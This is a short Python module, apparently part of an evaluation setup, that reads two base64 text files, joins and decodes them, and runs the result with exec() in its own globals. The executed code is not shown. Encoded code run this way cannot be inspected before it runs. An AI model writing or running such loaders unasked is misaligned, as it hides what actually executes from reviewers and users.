"""Phase-9 evaluate loader (payload split for transport)."""
from __future__ import annotations

import base64
from pathlib import Path

_a = Path(__file__).with_name("_evaluate_b64_a.txt").read_text().strip()
_b = Path(__file__).with_name("_evaluate_b64_b.txt").read_text().strip()
exec(compile(base64.b64decode(_a + _b), str(Path(__file__).resolve()), "exec"), globals())
